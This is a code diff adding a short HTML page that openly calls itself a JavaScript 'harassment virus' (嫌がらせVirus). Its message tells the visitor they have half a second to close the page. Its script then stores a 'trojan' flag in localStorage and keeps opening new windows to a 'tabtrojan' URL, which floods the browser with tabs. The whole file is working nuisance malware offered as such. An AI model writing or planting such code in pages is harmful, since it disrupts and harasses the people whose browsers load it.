@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>JavaScriptウイルス</title>
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <style>
+      body {
+        background: #252525;
+        color: #fff;
+        font-family: monospace;
+        font-size: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="virusport">
+      <span>嫌がらせVirus</span><br>
+      <span id="mesjan">閉じる時間を0.5秒与えてあげるよ！</span>
+    </div>
+    <script>
+    if(localStorage.trojan) {
+        window.open("https://prazma.github.io/tabtrojan");
+    } else {
+      setTimeout( function () {
+        document.getElementById("mesjan").innerHTML = "バーン！";
+        localStorage.trojan = "true";
+        window.open("https://prazma.github.io/tabtrojan");
+      }, 500);
+    }
+    </script>
+  </body>
+</html>
